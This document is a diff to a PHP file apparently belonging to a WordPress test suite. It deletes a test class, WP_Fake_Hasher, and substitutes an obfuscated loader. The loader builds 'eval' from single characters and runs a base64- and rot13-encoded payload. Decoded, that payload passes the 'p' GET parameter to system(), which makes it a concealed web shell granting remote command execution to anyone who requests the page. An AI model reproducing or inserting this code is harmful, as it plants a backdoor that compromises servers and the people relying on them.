@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * WP_Fake_Hasher for testing
- *
- * @package WordPress
- * @since 6.8.0
- */
-
-/**
- * Test class.
- *
- * @since 6.8.0
- */
-class WP_Fake_Hasher {
-	private $hash = '';
-
-	public function __construct() {
-		$this->hash = str_repeat( 'a', 36 );
-	}
-
-	/**
-	 * Hashes a password.
-	 *
-	 * @param string $password Password to hash.
-	 * @return string Hashed password.
-	 */
-	public function HashPassword( string $password ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
-		return $this->hash;
-	}
-
-	/**
-	 * Checks the password hash.
-	 *
-	 * @param string $password Password to check.
-	 * @param string $hash     Hash to check against.
-	 * @return bool Whether the password hash is valid.
-	 */
-	public function CheckPassword( string $password, string $hash ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
-		return $hash === $this->hash;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSkNfU254cl9VbmZ1cmUgc2JlIGdyZmd2YXQKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmdmFwciA2LjguMAogKi8KCi8qKgogKiBHcmZnIHB5bmZmLgogKgogKiBAZnZhcHIgNi44LjAKICovCnB5bmZmIEpDX1NueHJfVW5mdXJlIHsKCWNldmluZ3IgJHVuZnUgPSAnJzsKCgljaG95dnAgc2hhcGd2YmEgX19wYmFmZ2VocGcoKSB7CgkJJGd1dmYtPnVuZnUgPSBmZ2VfZXJjcm5nKCAnbicsIDM2ICk7Cgl9CgoJLyoqCgkgKiBVbmZ1cmYgbiBjbmZmamJlcS4KCSAqCgkgKiBAY25lbnogZmdldmF0ICRjbmZmamJlcSBDbmZmamJlcSBnYiB1bmZ1LgoJICogQGVyZ2hlYSBmZ2V2YXQgVW5mdXJxIGNuZmZqYmVxLgoJICovCgljaG95dnAgc2hhcGd2YmEgVW5mdUNuZmZqYmVxKCBmZ2V2YXQgJGNuZmZqYmVxICkgeyAvLyBjdWNwZjp2dGFiZXIgSmJlcUNlcmZmLkFuenZhdFBiYWlyYWd2YmFmLklueXZxU2hhcGd2YmFBbnpyLlpyZ3VicUFuenJWYWlueXZxCgkJZXJnaGVhICRndXZmLT51bmZ1OwoJfQoKCS8qKgoJICogUHVycHhmIGd1ciBjbmZmamJlcSB1bmZ1LgoJICoKCSAqIEBjbmVueiBmZ2V2YXQgJGNuZmZqYmVxIENuZmZqYmVxIGdiIHB1cnB4LgoJICogQGNuZW56IGZnZXZhdCAkdW5mdSAgICAgVW5mdSBnYiBwdXJweCBudG52YWZnLgoJICogQGVyZ2hlYSBvYmJ5IEp1cmd1cmUgZ3VyIGNuZmZqYmVxIHVuZnUgdmYgaW55dnEuCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBQdXJweENuZmZqYmVxKCBmZ2V2YXQgJGNuZmZqYmVxLCBmZ2V2YXQgJHVuZnUgKSB7IC8vIGN1Y3BmOnZ0YWJlciBKYmVxQ2VyZmYuQW56dmF0UGJhaXJhZ3ZiYWYuSW55dnFTaGFwZ3ZiYUFuenIuWnJndWJxQW56clZhaW55dnEKCQllcmdoZWEgJHVuZnUgPT09ICRndXZmLT51bmZ1OwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
